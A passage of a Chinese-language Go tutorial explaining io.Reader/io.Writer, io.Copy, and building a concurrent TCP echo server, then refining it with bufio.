</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">p</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#a6e22e">n</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Writer</span> <span style="color:#66d9ef">interface</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">p</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#a6e22e">n</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>以上两种数据类型都被定义为接口，这意味着它们不能直接被实例化。而是有 某种数据类型实现上述的 Read 或 Write 方法，该 Read 或 Write 方法才能被视为 Reader 或 Writer</p>
<p>例如，以下自定义的结构体类型 FooReader 可以满足约定，并且可以在任何接受 Reader 和 Writer 的地方使用。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FooReader</span> <span style="color:#66d9ef">struct</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooReader</span>) <span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">p</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 从某处（任何地方）读取一些数据
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> len(<span style="color:#a6e22e">dataReadFromSomewhere</span>), <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooReader</span>) <span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">p</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 将数据写入某处
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> len(<span style="color:#a6e22e">dataReadFromSomewhere</span>), <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>参照上述示例，可以自定义包装了 stdin 和 stdout 的 Reader 和 Writer 。自从 Go 的 os.Stdin 和 os.Stdout 类型充当 Reader 和 Writer 以来，很多人编写过与此相关的代码，但如果你不时常重新造轮子，那么就可能学不到任何东西。</p>
<p>结构体类型 FooWriter 和 FooReader 的完整实现:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// FooReader 定义了一个从标准输入 (stdin) 读取的 io.Reader.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FooReader</span> <span style="color:#66d9ef">struct</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Read 从标准输入 (stdin) 读取数据
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooReader</span>) <span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">&#34;in &gt; &#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdin</span>.<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// FooWriter 定义了一个写入标准输出 (stdout) 的 io.Writer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FooWriter</span> <span style="color:#66d9ef">struct</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Write 将数据写入标准输出 (stdout)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooWriter</span>) <span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">&#34;out&gt; &#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdout</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 实例化 reader 和 writer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">reader</span> <span style="color:#a6e22e">FooReader</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">writer</span> <span style="color:#a6e22e">FooWriter</span>
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 创建缓冲区以保存输入/输出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">input</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">4096</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 使用 reader 读取输入
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">input</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to read data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Read %d bytes from stdin\n&#34;</span>, <span style="color:#a6e22e">s</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 使用 writer 写入输出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">writer</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">input</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to write data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Wrote %d bytes to stdout\n&#34;</span>, <span style="color:#a6e22e">s</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>将数据从 Reader 复制到 Writer 是一种非常常见的模式，这促使 Go 的 io 包中提供一个函数 Copy() ,该函数可用于简化函数 main() 。函数Copy()原型如下。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">dst</span> <span style="color:#a6e22e">Writer</span>, <span style="color:#a6e22e">src</span> <span style="color:#a6e22e">Reader</span>) (<span style="color:#a6e22e">written</span> <span style="color:#66d9ef">int64</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>)
</span></span></code></pre></div><p>使用这个函数 Copy() 可以实现与以前相同的效果</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// FooReader defines an io.Reader to read from stdin.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FooReader</span> <span style="color:#66d9ef">struct</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Read reads data from stdin.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">fooReader</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooReader</span>) <span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">&#34;in &gt; &#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdin</span>.<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// FooWriter defines an io.Writer to write to Stdout.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FooWriter</span> <span style="color:#66d9ef">struct</span>{}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Write writes data to Stdout.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">fooWriter</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">FooWriter</span>) <span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">&#34;out&gt; &#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdout</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Instantiate reader and writer.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">reader</span> <span style="color:#a6e22e">FooReader</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">writer</span> <span style="color:#a6e22e">FooWriter</span>
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">writer</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">reader</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to read/write data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>注意，对 reader.Read([]byte) 和 writer.Write([]byte) 的显式调用已替换为对 io.Copy(writer,,reader) 的单个调用。背后的机制是 io.Copy(writer,reader) 调用提供的 reader 上的函数 Read([]byte) ,触发 FooReader 从 stdin 读取。随后， io.Copy(writer,reader) 在 writer 上调用函数 Wite([]byte) ,从而引起对 FooWriter 的调用，而 FooWriter 则将数据写入 stdout 。实际上，io.Copy(writer,reader) 按顺序处理先读后写的过程，而无须处理各种琐碎的细节。</p>
<p>本部分内容绝不是对 Go 的 I/O 和接口的全面介绍。许多便捷函数以及自定义的 Reader 和 Writer 只是 Go 标准包的其中一个组成部分。大多数情况下，Go的标准包都包含所有用于完成最常见任务的基本实现。在下一节中，我们将探讨如何将这些基础知识应用到TCP通信中，以使你能开发一些实用工具。</p>
<h3 id="22-创建回显服务器">2.2 创建回显服务器<a hidden class="anchor" aria-hidden="true" href="#22-创建回显服务器">#</a></h3>
<p>按照大多数语言的习惯，首先需要构建一个回显服务器，以学习如何在套接字中读写数据。为此，需要用到 net.Conn ( Go 的面向流的网络连接)，我们在构建端口扫描器时对此有过介绍。由 Go 的文档可知，Conn 实现了针对接口 Reader 和 Writer 定义的函数 Read([]byte) 和 Write([]byte) 。因此，Conn可以既是 Reader 又是 Writer 。从逻辑上讲这是合理的，因为 TCP 连接是双向的，可以用来发送（写入）或接收（读取）数据。</p>
<p>创建 Conn 实例后，可以通过 TCP 套接字发送和接收数据。不过，TCP服务器不能简单地创建一个连接，连接必须由客户端发起建立。在 Go 中，首先可以使用
net.Listen(network,address string) 在特定端口上打开 TCP 监听器。客户端连接后，方法 Accept() 将创建并返回一个 Conn 对象，可以使用该对象接收和发送数据。</p>
<p>实现回显服务器的完整示例:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// echo is a handler function that simply echoes received data.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// echo 是一个处理（handler）函数,它仅回显接收到的数据
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create a buffer to store received data.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 创建一个缓冲区来存储接收到的数据
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">b</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">512</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Receive data via conn.Read into a buffer.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// 通过 conn.Read 接收数据到一个缓冲区
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">size</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">0</span>:])
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">EOF</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Unexpected error&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">EOF</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">size</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Client disconnected&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Received %d bytes: %s&#34;</span>, <span style="color:#a6e22e">size</span>, string(<span style="color:#a6e22e">b</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Send data via conn.Write.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// 通过 conn.Write 发送数据
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Writing data&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span>[<span style="color:#ae81ff">0</span>:<span style="color:#a6e22e">size</span>]); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to write data&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Bind to TCP port 20080 on all interfaces.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 在所有接口上绑定 Tcp 端口 20080
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">listener</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Listen</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#e6db74">&#34;:20080&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to bind to port&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Listening on 0.0.0.0:20080&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Wait for connection. Create net.Conn on connection established.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// 等待连接。在已建立的连接上创建 net.conn
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">listener</span>.<span style="color:#a6e22e">Accept</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Received connection&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to accept connection&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Handle the connection. Using goroutine for concurrency.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// 处理连接。使用 goroutine 实现并发
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>首先定义了一个名为 echo(net.Conn) 的函数，该函数接收 Conn 实例作为参数。它充当执行所有必要的 I/O 连接的处理程序。该函数使用缓冲从连接读取数据以及向连接写入数据，进行无限循环。数据会被读入一个名为 b 的变量中，再写回该连接。</p>
<p>现在，需要设置一个监听器，该监听器将调用处理程序。如前所述，服务器无法建立连接，且必须监听来自客户端的连接请求。因此，使用 net.Listen(network,address string) 函数在所有接口上启用定义为绑定到 TCP 端口 20080 的监听器。</p>
<p>接下来，无限循环确保即使己经收到一个连接，服务器仍将继续监听新的连接请求。在此循环中，调用 listener.Accept() 接受客户端的连接。当客户端连接成功时，此函数返回一个 Conn 实例。回想本节前面所述的内容，即 Conn 既是 Reader 也是 Writer ,它实现了 Read([]byte) 和 Write([]byte)方法。</p>
<p>之后，将 Conn 实例传递给处理函数 echo(net.Conn)。该调用以关键字 go 开头，使其成为并发调用，以便在等待处理函数完成时其他连接不会阻塞。对于这样一个简单的回显服务器来说，执行以上操作可能并不容易。但我们之所以会花笔墨对其进行介绍是为了让你更好地理解 Go 并发模式的简单性。此时，有两个轻量级线程在同时运行。</p>
<ul>
<li>主线程循环返回并在 listener.Accept() 等待另一个连接时阻塞。</li>
<li>处理程序 goroutine 的执行己转移到函数 echo(net.Conn) ,继续运行并处理数据</li>
</ul>
<p>这个回显服务器将客户端发送给它的内容完全重复地发回给客户端。可以看出这是一个简单、有用的例子。</p>
<h3 id="23-通过创建带缓冲的监听器来改进代码">2.3 通过创建带缓冲的监听器来改进代码<a hidden class="anchor" aria-hidden="true" href="#23-通过创建带缓冲的监听器来改进代码">#</a></h3>
<p>上面的示例可以正常运行，但是依赖相当低级的函数调用、缓冲区跟踪以及重复的读/写。其运行过程很乏味且容易出错。不过， Go 还包含其他一些可以简化此过程并降低代码复杂性的包，具体来说，bufio 包包装了 Reader 和 Writer ,以创建 I/O缓冲机制。更新后的函数 echo（net.Conn）以及对此的详细讲解如下所示。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">reader</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">bufio</span>.<span style="color:#a6e22e">NewReader</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">ReadString</span>(<span style="color:#e6db74">&#39;\n&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to read data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Received %d bytes: %s&#34;</span>, len(<span style="color:#a6e22e">s</span>), <span style="color:#a6e22e">s</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Writing data&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">writer</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">bufio</span>.<span style="color:#a6e22e">NewWriter</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">writer</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">s</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to write data&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">writer</span>.<span style="color:#a6e22e">Flush</span>()
</span></span><span style="display:flex;"><span>}
